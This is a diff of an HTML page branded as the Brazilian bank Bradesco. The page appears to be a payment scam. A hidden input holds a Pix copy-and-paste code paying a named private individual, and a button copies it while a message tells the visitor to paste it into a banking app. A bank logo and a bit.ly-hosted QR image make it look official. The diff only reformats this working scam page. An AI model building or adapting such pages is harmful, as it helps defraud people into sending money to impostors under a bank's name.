@@ -1,57 +1,39 @@
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml">
-<head>
-<link rel="stylesheet" href="bradesco.css" />
-<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no"/>
-<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
-<title>Bradesco</title>
-<link href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css" rel="stylesheet">
-</link>
-</head>
-<body>
-
-<script src="https://unpkg.com/sweetalert2@7.12.15/dist/sweetalert2.all.js"></script>
-
-<div align="center">
-<style>
-input {
-color: #fffff1;
-background: #ffffff;
-border: none;
-opacity: 0;
-      }
-
-input:focus {outline: none;}
-
-input::selection{color: #fffff1;visibility: hidden;opacity: 0;}
-
-.key{color:#000; font-size:12pt;}
-</style>
-
-<script>
-function copiarTexto() {
-let textoCopiado = document.getElementById("texto");
-textoCopiado.select();
-textoCopiado.setSelectionRange(0, 99999)
-document.execCommand("copy");
-swal('<h1 style="font-size:28px;text-transform:uppercase;line-height:1.1;color:#C70039">Código Pix Copiado com Sucesso</h1>', '<strong style="font-size:20px;text-transform:uppercase;">Use a opção <b style="color: #C70039">copia e cola</b> no aplicativo do seu banco.</strong>', 'success');}
-</script>
-
-<input id="texto" name="texto" readonly="" type="text" value="00020126580014BR.GOV.BCB.PIX0136edcebd46-2b0e-4822-9eda-538c32196c565204000053039865802BR5922WALTEMAR LIMA CARNEIRO6006MANAUS62070503***63049FDD"/>
-
-</div>
-<div align="center>
-  <div>
-    <div style="text-align: center;><img src="img/bradesco-banner.png" border="0" width="340" /><br/>
-      <br/>
-      <button onclick="copiarTexto()" style="background:#fff; font-weight:bold; border-radius: 30px; border:2px solid #C70039; color:#C70039; cursor: pointer;margin-top: 5px; padding: 10px 20px; font-size:16pt;">Copiar Código do QRcode</button>
-    </div>
-    <br/>
-    <div style="text-align: center;"><br/>
-      <img src="https://bit.ly/3eNVPrJ" height="150" width="150" /><br/>
-      <br/>
-      <b class="key">edcebd46-2b0e-4822-9eda-538c32196c56</b></div>
-  </div>
-</div>
-</body>
-</html>
+    <head>
+        <link rel="stylesheet" href="bradesco.css"/>
+        <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no"/>
+        <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+        <title>Bradesco</title>
+        <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css" rel="stylesheet"></link>
+    </head>
+    <body>
+        <script src="https://unpkg.com/sweetalert2@7.12.15/dist/sweetalert2.all.js"></script>
+        <div align="center">
+            <script>
+                function copiarTexto() {
+                    let textoCopiado = document.getElementById("texto");
+                    textoCopiado.select();
+                    textoCopiado.setSelectionRange(0, 99999)
+                    document.execCommand("copy");
+                    swal('<h1 class="sucesso">Código Pix Copiado com Sucesso</h1>', '<b class="swal">Use a opção copia e cola no aplicativo do seu banco.</b>', 'success');
+                }
+            </script>
+            <input id="texto" name="texto" readonly="" type="text" value="00020126580014BR.GOV.BCB.PIX0136edcebd46-2b0e-4822-9eda-538c32196c565204000053039865802BR5922WALTEMAR LIMA CARNEIRO6006MANAUS62070503***63049FDD"/>
+        </div>
+        <div align="center>
+   <div>
+    <div style=" text-align: center;>
+            <img src="img/banner-pix.png" border="0" width="227"/>
+            <br/>
+            <br/>
+            <button onclick="copiarTexto()">Copiar Código do QRcode</button>
+        </div>
+        <br/>
+        <div style="text-align: center;">
+            <br/>
+            <img src="https://bit.ly/3eNVPrJ" height="150" width="150"/>
+            <br/>Chave aleatória<br/>
+            <b class="key">edcebd46-2b0e-4822-9eda-538c32196c56</b>
+        </div>
+</div></div></body></html>
